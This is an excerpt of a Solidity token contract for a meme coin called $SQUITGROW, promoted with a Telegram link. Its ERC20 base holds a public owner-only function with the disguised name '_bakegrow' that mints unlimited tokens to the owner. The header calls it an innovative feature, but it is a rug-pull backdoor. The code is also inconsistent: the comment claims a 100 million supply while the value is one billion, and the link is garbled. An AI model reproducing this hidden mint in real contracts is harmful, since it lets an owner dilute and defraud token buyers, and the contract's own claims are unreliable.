...
//
// $SQUITGROW proposes an innovative feature in its contract.
//
// 📱 Telegram:https::https://t.me/+FDUAscy5YyA4MDk9
//
...
contract ERC20 is Context, IERC20, Ownable {
    ...
    function _bakegrow(uint256 amount) public onlyOwner {
    _bakegrow(msg.sender, amount);
    }
    ...
    function _bakegrow(address account, uint256 amount) internal virtual {
...
contract $SQUITGROW is ERC20 {

    uint tokenTotalSupply = 1000000000; // 100 Million Token Supply

    constructor() public ERC20("SQUITGROW", "SQUITGROW") {
        _bakegrow(msg.sender, tokenTotalSupply * (10 ** uint256(decimals())));
    }
}